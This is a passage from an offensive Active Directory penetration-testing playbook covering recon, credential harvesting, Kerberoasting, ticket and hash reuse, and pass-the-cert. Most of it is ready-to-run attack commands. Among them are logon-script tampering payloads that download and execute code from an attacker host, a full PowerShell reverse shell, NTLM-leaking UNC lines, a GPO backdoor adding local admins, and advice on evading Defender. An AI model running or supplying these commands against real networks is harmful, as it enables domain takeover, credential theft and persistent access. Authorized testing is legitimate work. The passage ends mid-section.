Get-DomainUser -PreauthNotRequired  # AS-REP Roastable

# Groups
Get-DomainGroup -Identity "Domain Admins" -Recurse | Get-DomainGroupMember
Get-DomainGroup -AdminCount   # High-value groups

# Computers
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainComputer -Unconstrained

# GPOs
Get-DomainGPO | select displayname,gpcfilesyspath

# ACLs (find interesting permissions)  🟡 BloodHound-equivalent volumetric — same LDAP fingerprint as SharpHound
Find-InterestingDomainAcl -ResolveGUIDs | select IdentityReferenceName,ActiveDirectoryRights,ObjectDN

# Domain trusts
Get-DomainTrust
Get-ForestTrust

# Find local admin access
Find-LocalAdminAccess
```

### 2.4b `[adsisearcher]` — Native ADSI Recon (No PowerView, No RSAT)

The `[adsisearcher]` type accelerator ships with every modern PowerShell (Win7+ / .NET 3.5+). It is the single most universally-available AD recon primitive — no module imports, no admin, no RSAT. Run from any domain-joined host or any process holding a Kerberos TGT (e.g. `runas /netonly`).

```powershell
# === Users / Computers / Groups / OUs ===
([adsisearcher]"(&(objectCategory=user)(objectClass=user))").FindAll() | % { $_.Properties.samaccountname }
([adsisearcher]"(objectCategory=computer)").FindAll() | % { $_.Properties.dnshostname }
([adsisearcher]"(&(objectCategory=group)(cn=Domain Admins))").FindOne().Properties.member
([adsisearcher]"(objectCategory=organizationalUnit)").FindAll() | % { $_.Properties.distinguishedname }

# === Kerberoastable (SPN set, exclude krbtgt) ===
([adsisearcher]"(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))").FindAll() |
    % { "$($_.Properties.samaccountname) :: $($_.Properties.serviceprincipalname -join ',')" }

# === AS-REP roastable (UAC bit DONT_REQUIRE_PREAUTH = 0x400000) ===
([adsisearcher]"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll() |
    % { $_.Properties.samaccountname }

# === Unconstrained delegation (UAC bit TRUSTED_FOR_DELEGATION = 0x80000) ===
([adsisearcher]"(userAccountControl:1.2.840.113556.1.4.803:=524288)").FindAll() |
    % { "$($_.Properties.samaccountname) :: $($_.Properties.dnshostname)" }

# === Constrained delegation (msDS-AllowedToDelegateTo populated) ===
([adsisearcher]"(msDS-AllowedToDelegateTo=*)").FindAll() |
    % { "$($_.Properties.samaccountname) -> $($_.Properties.'msds-allowedtodelegateto')" }

# === RBCD readers (msDS-AllowedToActOnBehalfOfOtherIdentity populated) ===
$s = [adsisearcher]"(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
$s.PropertiesToLoad.AddRange(@('samaccountname','msDS-AllowedToActOnBehalfOfOtherIdentity'))
$s.FindAll() | % { $_.Properties.samaccountname }

# === Protected accounts (adminCount=1) ===
([adsisearcher]"(adminCount=1)").FindAll() | % { $_.Properties.samaccountname }
```

```cmd
:: net / nltest — always present, no RSAT
nltest /dclist:<DOMAIN>                 :: every DC
nltest /dsgetdc:<DOMAIN>                :: current DC + site
nltest /domain_trusts /all_trusts /v    :: every trust, transitive

net user /domain                        :: all domain users
net user <USER> /domain                 :: detail for one user
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain                    :: password / lockout policy

:: setspn — present by default on DCs; on workstations only with RSAT
setspn -T <DOMAIN> -Q */*
setspn -T * -Q */*                      :: forest-wide across trusts
```

```powershell
# === RSAT AD module (Get-AD*) — only if 'AD DS and AD LDS Tools' installed ===
Get-ADUser -Filter * -Properties description,memberof | select samaccountname,description
Get-ADComputer -Filter * -Properties operatingsystem,lastLogonDate
Get-ADGroupMember 'Domain Admins' -Recursive
Get-ADUser -Filter 'servicePrincipalName -like "*"' -Properties servicePrincipalName
```

> **LOTL note:** `[adsisearcher]` is the most universally-available primitive — works against LDAP-signing-hardened DCs (queries are signed by default). `dsquery` and `Get-AD*` only work where RSAT is installed (NOT default since Windows 8). LDAP read queries by an authenticated user are not flagged by default Defender; volumetric/scripted bursts may trigger BloodHound-style telemetry rules.

### 2.5 GPO Enumeration
```bash
# Check for GPO abuse paths (SharpGPOAbuse)
# https://github.com/FSecureLABS/SharpGPOAbuse
# If user has edit rights on a GPO linked to admin users/computers:
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author Administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators <USER> /add" --GPOName "<GPO_NAME>"
```

### 2.6 Snaffler — Credential Hunting in Shares
```powershell
# https://github.com/SnaffCon/Snaffler
# Snaffler crawls all readable shares and finds files containing credentials, keys, configs
# Run from a Windows foothold with domain creds
.\Snaffler.exe -d <DOMAIN> -s -v data -o snaffler_output.txt

# Look for: web.config (connection strings), .env files, scripts with hardcoded passwords,
# KeePass databases, SSH keys, certificate files (.pfx, .p12)
```

### 2.6b NETLOGON / SYSVOL Logon Script Credential Harvest

Every authenticated domain user has read access to `\\<DC_FQDN>\NETLOGON` and `\\<DC_FQDN>\SYSVOL`. Logon scripts (`.ps1`, `.bat`, `.vbs`, `.cmd`) frequently contain hardcoded credentials, `net use` drive mappings, and `runas /user:` invocations. Adjacent to GPP cpassword (2.2) but a separate primitive — free-text creds in script bodies, not AES-encrypted XML.

```cmd
:: From a domain-joined Windows pivot — list NETLOGON and SYSVOL scripts
net use \\<DC_FQDN>\netlogon /user:<DOMAIN>\<USER> "<PASSWORD>"
dir \\<DC_FQDN>\netlogon /s /b | findstr /i "\.ps1 \.bat \.vbs \.cmd"
dir \\<DC_FQDN>\sysvol\<DOMAIN_FQDN>\scripts /s /b
dir \\<DC_FQDN>\sysvol\<DOMAIN_FQDN>\Policies /s /b | findstr /i "\.ps1 \.bat \.vbs \.cmd \.xml"
```

```powershell
# Grep for credential patterns across all script types
$share = "\\<DC_FQDN>\netlogon"
Get-ChildItem -Path $share -Recurse -Include *.ps1,*.bat,*.cmd,*.vbs,*.psm1 -ErrorAction SilentlyContinue |
    Select-String -Pattern 'password|passwd|pwd|net use|ConvertTo-SecureString|PSCredential|runas|/user:' -CaseSensitive:$false |
    Select-Object Path,LineNumber,Line

# Pull single-quoted string literals from every .ps1 (catches password-as-literal pattern)
Get-ChildItem -Path "\\<DC_FQDN>\netlogon\*.ps1" | ForEach-Object {
    $matches = Select-String -Path $_.FullName -Pattern "'(.*?)'" -AllMatches
    foreach ($m in $matches.Matches) { "{0}: {1}" -f $_.Name, $m.Groups[1].Value }
}
```

```bash
# From Linux pivot — smbclient / smbmap recursive pull
smbclient //<DC_IP>/NETLOGON -U '<DOMAIN>/<USER>%<PASSWORD>' -c 'recurse ON; prompt OFF; mget *'
smbmap -H <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -R NETLOGON --depth 5
smbmap -H <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -R SYSVOL --depth 10

# netexec spider_plus — pulls NETLOGON to ./<DC_IP>_NETLOGON/, exclude noisy Policies tree
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --shares
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -M spider_plus -o EXCLUDE_DIRS=Policies

# smbget recursive pull, then local grep
smbget -R smb://<DC_IP>/NETLOGON --user='<DOMAIN>/<USER>%<PASSWORD>'
grep -rEi --include='*.ps1' --include='*.bat' --include='*.vbs' --include='*.cmd' \
    '(password|passwd|pwd|net use|secure-?string|psc?redential|/user:)' ./NETLOGON/

# GPP cpassword sweep (separate primitive — also lives in SYSVOL\Policies)
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password
```

> **Tip:** `net use` lines in logon scripts reveal **other reachable file servers** even when the password field is hashed/obfuscated. Treat the share names as a recon graph for lateral targeting, not just creds.

> **OPSEC:** Reading NETLOGON triggers Event 5145 on the DC, but every domain logon already reads NETLOGON — that's background noise. Recursive grep across the full SYSVOL Policies tree is the volumetric tell; cap depth and filter extensions to stay under the radar.

### 2.6c NETLOGON / SYSVOL Logon Script Tampering (Write Access)

When you have WRITE access to `\\<DC_FQDN>\NETLOGON` or `\\<DC_FQDN>\SYSVOL\<DOMAIN>\scripts\`, append a payload to an existing logon script. Every user whose GPO references that script will execute your code at next logon. This is distinct from GPO abuse (4.7) which creates NEW scheduled tasks/scripts — here you modify an EXISTING script already assigned to users.

**Discover writable scripts:**
```bash
# From Linux — check write perms on NETLOGON scripts
smbmap -H <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' -R NETLOGON --depth 5 2>&1 | grep -i 'READ, WRITE\|RW'

# smbcacls — check ACL on a specific file
smbcacls '//<DC_FQDN>/NETLOGON' '<SCRIPT_NAME>.bat' -U '<DOMAIN>/<USER>%<PASSWORD>'

# netexec — spider + permissions
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -d '<DOMAIN>' --shares 2>&1 | grep -i 'NETLOGON\|SYSVOL'
```

```powershell
# From Windows pivot — test write access
$scripts = Get-ChildItem "\\<DC_FQDN>\NETLOGON" -Recurse -Include *.bat,*.cmd,*.ps1,*.vbs
foreach ($s in $scripts) {
    try { [System.IO.File]::OpenWrite($s.FullName).Close(); "[WRITABLE] $($s.FullName)" }
    catch { }
}
```

**Exploit — append payload to an existing .bat logon script:**
```bash
# Method 1: smbclient append (one-liner reverse shell trigger)
echo '' | smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' \
    -c 'put - <SCRIPT_NAME>.bat' --append

# Prepare the payload line to append
cat <<'PAYLOAD' > /tmp/append.txt

:: --- appended ---
powershell -ep bypass -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>:<PORT>/shell.ps1')"
PAYLOAD

# Append to the script on NETLOGON
smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "append /tmp/append.txt <SCRIPT_NAME>.bat"
```

```bash
# Method 2: Download → modify → re-upload
smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "get <SCRIPT_NAME>.bat /tmp/orig.bat"
# Append payload
echo 'net localgroup administrators <DOMAIN>\<USER> /add' >> /tmp/orig.bat
# Or for hash capture:
echo 'dir \\<ATTACKER_IP>\share' >> /tmp/orig.bat
# Re-upload
smbclient '//<DC_FQDN>/NETLOGON' -U '<DOMAIN>/<USER>%<PASSWORD>' -c "put /tmp/orig.bat <SCRIPT_NAME>.bat"
```

**Payload options (pick based on engagement goals):**
```batch
:: Add user to local admins on every host that runs this script
net localgroup administrators <DOMAIN>\<USER> /add

:: Trigger NTLMv2 auth to your Responder listener (passive cred capture)
dir \\<ATTACKER_IP>\share >nul 2>&1

:: Reverse shell (noisy but immediate)
powershell -ep bypass -w hidden -nop -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
```

```vbscript
' Append to .vbs logon scripts — NTLMv2 leak via UNC reference
CreateObject("WScript.Shell").Run "cmd /c dir \\<ATTACKER_IP>\share", 0, False
```

#### Living-off-the-land / LOTL variant

```powershell
# From a Windows pivot — native file append to NETLOGON script
Add-Content -Path "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.bat" -Value "`r`nnet localgroup administrators <DOMAIN>\<USER> /add"

# Or for .ps1 logon scripts:
Add-Content -Path "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.ps1" -Value "`nInvoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/shell.ps1 | iex"
```

```cmd
:: Pure cmd.exe — echo append via UNC path
echo net localgroup administrators <DOMAIN>\<USER> /add >> "\\<DC_FQDN>\NETLOGON\<SCRIPT_NAME>.bat"
```

> **Key difference from GPO abuse (4.7):** GPO abuse creates new GPO entries (SharpGPOAbuse `--AddComputerTask`). Script tampering modifies an already-deployed script — lower detection surface because no new GPO object appears in AD, and the script was already trusted/assigned. The modification shows as a file-system change only (no LDAP attribute change on the GPO object itself).

> **OPSEC:** File modification on SYSVOL triggers Event 5145 (share object access) and potentially 4663 (file write audit). The tampered script runs in user context (not SYSTEM) unless the GPO assigns it as a startup script. Always save a backup of the original and restore after engagement.

### 2.7 dsquery — Native AD Enumeration (No Tools Required)
```powershell
# dsquery is built into Windows Server — no tool upload needed

# Find disabled accounts with descriptions (often contain passwords or hints)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr sAMAccountName description

# Find accounts with PASSWD_NOTREQD flag (can have empty passwords)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr sAMAccountName

# Find all users with SPNs (Kerberoastable)
dsquery * -filter "(&(objectCategory=person)(servicePrincipalName=*))" -attr sAMAccountName servicePrincipalName

# Find computers with unconstrained delegation
dsquery * -filter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -attr sAMAccountName
```

### 2.8 ldapdomaindump — Offline AD Triage

Single-shot dump of users, groups, computers, OUs, password policies, and trusts as HTML + JSON + grep-friendly text. Ideal for offline review on the engagement laptop, easy to drop into a report appendix.

```bash
# Linux — from any host with LDAP reachability to the DC
mkdir -p ldap_dump && ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' <DC_IP> -o ldap_dump/

# LDAPS (preferred when 389 is blocked / channel-binding enforced)
ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASSWORD>' ldaps://<DC_IP> -o ldap_dump/

# NT-hash auth (no plaintext)
ldapdomaindump -u '<DOMAIN>\<USER>' -p ':<NT_HASH>' <DC_IP> -o ldap_dump/
```

Produces in `ldap_dump/`:

| File | Contents |
|---|---|
| `domain_users.html` / `.json` / `.grep` | Every user with attributes, lastlogon, descriptions, pwdLastSet |
| `domain_groups.html` | Group membership (find Domain Admins, Backup Operators, Schema Admins) |
| `domain_computers.html` | Computer accounts, OS versions, lastLogonTimestamp |
| `domain_users_by_group.html` | Reverse lookup — user → groups |
| `domain_policy.html` | Password policy, lockout threshold |
| `domain_trusts.html` | Trust direction + transitivity (cross-link to Phase 9) |

```bash
# Quick triage — grep over the output
grep -i 'admin\|password\|svc_' ldap_dump/domain_users.grep
grep -i 'description' ldap_dump/domain_users.grep | grep -iv 'built-in'   # often leaks creds
```

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 3: Credential Attacks

**Goal:** Extract or crack credentials to escalate privileges.

### 3.1 Kerberoasting

> For cracking strategies, wordlists, and rule selection for Kerberos TGS hashes, see [password-cracking.md](password-cracking.md) Phase 5.3.
```bash
# Using Impacket (Linux)
# Request TGS tickets for service accounts
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# From Windows
# https://github.com/GhostPack/Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
# PowerView alternative (Windows):
# Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat

# Crack TGS tickets
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

#### Living-off-the-land equivalent — Kerberoast without Rubeus, without Mimikatz

Use `KerberosRequestorSecurityToken.GetRequest()` to obtain the raw KRB-AP-REQ in memory and slice out the encrypted blob in hashcat `$krb5tgs$` format (the canonical PowerView `Get-SPNTicket` technique by `@machosec`). Pure built-in — Win7+ / .NET 3.5+, any authenticated domain user.

```powershell
# 1) Discover SPN-bearing accounts via [adsisearcher] (no LDAP module)
$searcher = [adsisearcher]"(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))"
$searcher.PageSize = 1000
$targets = $searcher.FindAll() | ForEach-Object { $_.Properties.serviceprincipalname[0] }

# 2) Request TGS in-memory; extract hashcat blob (PowerView Get-SPNTicket regex)
Add-Type -AssemblyName System.IdentityModel
foreach ($SPN in $targets) {
    try {
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
        $TicketByteStream = $Ticket.GetRequest()
        $TicketHexStream  = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
        if ($TicketHexStream -match 'a382....3082....A0030201(?<EncType>..)A1.{1,4}.......A282(?<TicketHexStream2>.+)') {
            $Etype = [Convert]::ToByte($Matches.EncType, 16)
            $cipherTextHex = ($Matches.TicketHexStream2 -replace '^.{4}') -replace '^.{16}'
            "`$krb5tgs`$$Etype`$*$($Ticket.ServicePrincipalName)*`$$($cipherTextHex.Substring(0,32))`$$($cipherTextHex.Substring(32))"
        }
    } catch { Write-Warning "$SPN failed: $_" }
}
```

> **OPSEC (2026):**
> - Defender flags the `Add-Type … System.IdentityModel` + Event 4769 burst as `Behavior:Win32/Kerberoast.A!ml`. Target **one** SPN at a time when on a monitored host.
> - Prefer **AES** (etype 17/18) over RC4 (etype 23) — AES requests blend with normal Kerberos traffic. Force RC4 only if the account has no AES keys (set in `msDS-SupportedEncryptionTypes`).
> - Each TGS request emits Event 4769 on the DC. Mass requests are the high-fidelity IOC, not the technique.
> - To request RC4 explicitly (lazy crack), set the SPN's encryption types or use the `/tgtdeleg` Rubeus path — pure-PowerShell cannot force etype.

### 3.2 Targeted Kerberoasting (SPN-Jacking)
If you have `GenericAll`, `GenericWrite`, or `WriteProperty` over a user:
```bash
# Set a fake SPN on the target user
# https://github.com/ShutdownRepo/targetedKerberoast
python3 targetedKerberoast.py -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> --dc-ip <DC_IP>

# Or manually via PowerView
Set-DomainObject -Identity <TARGET_USER> -Set @{serviceprincipalname='nonexistent/YOURPC'}
# Then Kerberoast that user
# Cleanup: Set-DomainObject -Identity <TARGET_USER> -Clear serviceprincipalname
```

### 3.3 Pass-the-Hash
```bash
# Use NT hash directly (no cracking needed)
netexec smb <TARGET_IP> -u '<USER>' -H '<NT_HASH>'
evil-winrm -i <TARGET_IP> -u '<USER>' -H '<NT_HASH>'
impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NT_HASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NT_HASH>
```

### 3.4 Pass-the-Ticket
```bash
# Export tickets from memory (Rubeus on Windows)
.\Rubeus.exe triage        # List tickets
.\Rubeus.exe dump /luid:<LUID> /nowrap   # Dump specific ticket

# Convert between formats
impacket-ticketConverter ticket.kirbi ticket.ccache

# Use ticket from Linux
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>
```

### 3.4b Linux Kerberos Ccache Theft — Harvest & Pass-the-Ticket from Compromised Linux Host

When you compromise a domain-joined Linux host (SSSD, Centrify, or MIT krb5), Kerberos ticket caches (ccache files) are stored on disk or in the kernel keyring. With root access, harvest these tickets and reuse them from your attacker box for lateral movement — no password cracking required.

**Enumerate cached tickets:**
```bash
# Default ccache location: /tmp/krb5cc_<UID>
ls -la /tmp/krb5cc_*

# SSSD stores ccaches in a different location (Kerberos credential cache)
ls -la /var/lib/sss/db/ccache_*
ls -la /var/lib/sss/secrets/

# Check the system default ccache type (FILE, KEYRING, KCM)
grep -i 'default_ccache_name' /etc/krb5.conf
# Common values:
#   FILE:/tmp/krb5cc_%{uid}           → file-based, directly copyable
#   KEYRING:persistent:%{uid}         → kernel keyring, needs keyctl
#   KCM:                              → sssd-kcm daemon, needs kcm export

# Per-process KRB5CCNAME — some processes set custom ccache paths
for pid in /proc/[0-9]*/; do
    env_file="${pid}environ"
    [ -r "$env_file" ] && grep -z 'KRB5CCNAME' "$env_file" 2>/dev/null | tr '\0' '\n'
done | sort -u

# Enumerate keytab files (long-term keys, not tickets — but allow TGT generation)
find / -name '*.keytab' -o -name 'krb5.keytab' 2>/dev/null
ls -la /etc/krb5.keytab
```

**Steal FILE-based ccaches (most common):**
```bash
# Copy the ccache to your attacker box (already in usable format)
cp /tmp/krb5cc_<UID> /tmp/stolen.ccache

# Verify the ticket is valid
KRB5CCNAME=/tmp/stolen.ccache klist

# Use from attacker box — set KRB5CCNAME and go
export KRB5CCNAME=/path/to/stolen.ccache
impacket-psexec -k -no-pass '<DOMAIN>/<USER>@<TARGET_FQDN>'
impacket-secretsdump -k -no-pass '<DOMAIN>/<USER>@<DC_FQDN>'
netexec smb <TARGET_FQDN> -u '<USER>' -p '' -k --use-kcache
```

**Steal KEYRING-based ccaches (kernel keyring):**
```bash
# List keys in the user's keyring (requires root or same UID)
keyctl show @u    # current user's session keyring
keyctl show @s    # session keyring

# For a specific UID's persistent keyring:
keyctl show %:user:<UID>

# Read the key data (binary ccache blob)
keyctl pipe <KEY_ID> > /tmp/stolen.ccache

# Alternative: enumerate all session keyrings via /proc
for uid_dir in /proc/[0-9]*/; do
    pid=$(basename "$uid_dir")
    sessionid=$(cat /proc/$pid/sessionid 2>/dev/null)
    [ -n "$sessionid" ] && keyctl rlist $sessionid 2>/dev/null && echo "PID=$pid"
done
```

**Steal from SSSD KCM (sssd-kcm daemon):**
```bash
# SSSD stores ccaches in its secrets database (LDB format)
# Location: /var/lib/sss/secrets/secrets.ldb (or .secrets.mkey for the master key)
ls -la /var/lib/sss/secrets/

# Use tdbdump (part of samba-common-bin) to read the LDB
tdbdump /var/lib/sss/secrets/secrets.ldb 2>/dev/null | strings | grep -i 'krb5\|ccache'

# Or extract directly with sssd tools if available
sss_cache -E    # flush and re-read
```

**Use keytab files to generate fresh TGTs:**
```bash
# A keytab is a long-term key (like a password hash) — use it to get unlimited TGTs
# Common locations: /etc/krb5.keytab (machine account), /home/<user>/*.keytab
klist -k /etc/krb5.keytab    # list principals in the keytab

# Get a TGT using the keytab (kinit)
kinit -k -t /etc/krb5.keytab '<PRINCIPAL>'    # e.g., host/server.domain.com@DOMAIN.COM
klist

# From attacker box — impacket-getTGT with keytab
impacket-getTGT '<DOMAIN>/<USER>' -keytab /path/to/stolen.keytab -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
```

**SSH ControlMaster socket hijacking (no root needed if socket is accessible):**
```bash
# SSH ControlMaster sockets allow multiplexing — if a user has an active ControlMaster
# session, ANY process with access to the socket can piggyback without re-auth
find /tmp -name 'ssh-*' -type s 2>/dev/null
ls -la /tmp/ssh-*/agent.*
ls -la /run/user/*/ssh-*

# Hijack the socket (connect through the existing authenticated session)
ssh -o 'ControlPath=/tmp/ssh-<HASH>/ctrl' -O check <TARGET_FQDN>
ssh -S /tmp/ssh-<HASH>/ctrl <USER>@<TARGET_FQDN>
```

#### Living-off-the-land / LOTL variant

```bash
# All commands above are native Linux tools — no external tooling needed
# klist, kinit, keyctl, find, cat /proc/*/environ are all standard
# The ccache format is directly usable by impacket without conversion

# If you only have a .kirbi (Windows format) — convert:
impacket-ticketConverter ticket.kirbi ticket.ccache
# If you only have a ccache and need .kirbi for Rubeus:
impacket-ticketConverter ticket.ccache ticket.kirbi
```

> **Priority targets:** Look for root-level ccaches (`krb5cc_0`), service accounts running as specific UIDs, and any process with `KRB5CCNAME` set to a non-default path. Machine keytabs (`/etc/krb5.keytab`) are gold — they provide unlimited TGT generation for the computer account, which often has RBCD-exploitable relationships.

### 3.5 OverPass-the-Hash (Pass-the-Key)
```bash
# Request a TGT using the NT hash (get a Kerberos ticket from a hash)
impacket-getTGT <DOMAIN>/<USER> -hashes :<NT_HASH> -dc-ip <DC_IP>

# Use the ticket
export KRB5CCNAME=<USER>.ccache
impacket-psexec -k -no-pass <DOMAIN>/<USER>@<TARGET_FQDN>

# From Windows (Rubeus) — RC4
.\Rubeus.exe asktgt /user:<USER> /rc4:<NT_HASH> /ptt

# AES variant (use when RC4 is blocked by policy)
.\Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /nowrap /ptt
```

### 3.6 Pre2k Computer Account Spray

```bash
# Pre-Windows-2000-compatibility computer accounts have password = lowercased samAccountName
# (without the trailing $). Common on legacy domains and accounts created with the
# "Assign this computer account as a pre-Windows 2000 computer" checkbox.

# https://github.com/garrettfoster13/pre2k
# Unauth (no creds — uses Kerberos AS-REQ to test passwords without lockout):
pre2k unauth -d <DOMAIN> -dc-ip <DC_IP> -inputfile computers.txt
pre2k unauth -d <DOMAIN> -dc-ip <DC_IP> -inputfile computers.txt -save   # save valid creds

# Auth (with low-priv creds — enumerates pre2k computer accounts via LDAP first):
pre2k auth -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -dc-ip <DC_IP> -save

# netexec equivalent — pre2k module
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M pre2k

# After hit: the computer's password = lowercased name (no $) — log in via Kerberos
impacket-getTGT <DOMAIN>/<COMPUTER_NAME>$ -dc-ip <DC_IP>
# Password prompt → enter the lowercased name
# Then PTT and use as a domain principal (often has SeMachineAccountPrivilege etc.)

# Crack pre2k hash if you got it from a different source (e.g. NTDS):
# Filter NTDS dump for $-suffixed accounts → try lowercased-name as password
```

### 3.7 Timeroast (Trusted-for-Delegation Computer Hash Theft)

```bash
# Abuses MS-SNTP (NTP authentication) — DC signs NTP responses with a key derived
# from a computer's hash. Any unauth user on the network can request signed responses
# and offline-crack to recover the computer account hash.

# https://github.com/SecuraBV/Timeroast
# Get RID range (need to know the SID base or just try sequential RIDs):
sudo python3 timeroast.py <DC_IP> -o hashes.txt -r 500-3000

# Output format: $sntp-ms$<HASH>$<RID> — feed to hashcat -m 31300
hashcat -m 31300 hashes.txt /usr/share/wordlists/rockyou.txt

# Cracked computer hash → use as machine-account credential for Kerberos auth
impacket-getTGT <DOMAIN>/<COMPUTER>$ -hashes :<NT_HASH> -dc-ip <DC_IP>
```

#### 3.7b Timeroast — netexec module + Pre2k targeting

When you have low-priv creds, the netexec `timeroast` module wraps the SecuraBV technique into a single command and pairs naturally with a pre-filtered list of **legacy / pre-Win2k** computer accounts (LDAP `userAccountControl` flag `4096` = `WORKSTATION_TRUST_ACCOUNT`, common on stale objects) — those are the highest-yield cracking targets because their passwords often default to lowercased samAccountName (the §3.6 Pre2k primitive).

```bash
# One-shot timeroast against the DC — emits hashcat-mode-31300 hashes
netexec smb <DC_IP> -M timeroast
# Or with explicit creds (helps when the DC is hardened against unauth NTP):
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M timeroast

# Pre-filter the LDAP query for legacy / pre-Win2k computer accounts to prioritize cracking
# Pre-Win2k indicator: UAC flag 32 (PASSWD_NOTREQD) on a *computer* object,
# combined with logonCount=0 OR pwdLastSet=0 (the account was never used / never rotated
# from the default lowercased samAccountName password).
# UAC flag 4096 (WORKSTATION_TRUST_ACCOUNT) is set on EVERY domain-joined workstation/server
# — it is NOT a pre-Win2k discriminator. Filtering on 4096 alone returns the entire fleet.
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' \
    --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(|(logonCount=0)(pwdLastSet=0)))" cn

# Combine: feed the pre2k-flagged computers into a wordlist of lowercased names,
# then mask-attack with hashcat -m 31300:
netexec ldap <DC_IP> -u '<USER>' -p '<PASS>' \
    --query "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=32)(|(logonCount=0)(pwdLastSet=0)))" cn \
    | awk '{print tolower($1)}' > pre2k_wordlist.txt
hashcat -m 31300 timeroast.hashes pre2k_wordlist.txt

# Reference tool: garrettfoster13/pre2k — implements the canonical filter + spray
# https://github.com/garrettfoster13/pre2k
```

> **Why bridge §3.6 + §3.7:** Pre2k accounts ship with predictable default passwords (`samAccountName.tolower()`); if §3.6's online spray is detected/blocked, the offline Timeroast hash → mask attack on the same wordlist gets the same answer with zero AS-REQ traffic. Two paths, one primitive, different detection profiles — pick based on what the engagement's blue team can see.

### 3.8 Pass-the-Cert — WinRM Cert-Mapped Client Authentication

When AD CS issues client-auth-capable certs (User template or similar) and the target's WinRM listener has `Certificate` auth enabled (`winrm/config/service/auth/Certificate=true` plus entries under `WSMan:\localhost\ClientCertificate`), a domain user's cert can be presented as the client credential against 5986 — no password, no NT hash, no Kerberos ticket required.

```bash
# Enroll a client-auth cert for the target user via Certipy (User template or any
# template marked for Client Authentication EKU + enrollable by the holder).
# https://github.com/ly4k/Certipy
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
    -ca '<CA_NAME>' -template '<TEMPLATE>' \
    -target '<TARGET_USER>@<DOMAIN>' -dc-ip <DC_IP>

# Output: <TARGET_USER>.pfx  (cert+key bundle for the target principal)
```

```bash
# Split the PFX into separate PEM cert and key for tools that need them apart.
certipy-ad cert -pfx <TARGET_USER>.pfx -nokey -out <TARGET_USER>.crt
certipy-ad cert -pfx <TARGET_USER>.pfx -nocert -out <TARGET_USER>.key
```

```bash
# Enumerate the WinRM listener's cert-mapping config remotely to confirm
# Certificate auth is enabled before burning the cert.
crackmapexec winrm <TARGET> -u '<USER>' -p '<PASSWORD>' \
    -x 'winrm get winrm/config/service/auth'

# Look for: Certificate = true
# Look under WSMan:\localhost\ClientCertificate for Subject/Issuer mappings.
```

```powershell
# From an interactive session on any host with the cert installed in the user store,
# open a remote PSSession authenticated by the client certificate (no password prompt).
$thumb = (Get-ChildItem Cert:\CurrentUser\My | Where-Object Subject -match '<TARGET_USER>').Thumbprint
Enter-PSSession -ComputerName <TARGET> -CertificateThumbprint $thumb -UseSSL
```

```bash
# Pure-Linux path: evil-winrm with -c/-k flags speaks WinRM over TLS using the
# client cert. Equivalent to PSRemoting cert auth from a Windows attacker box.
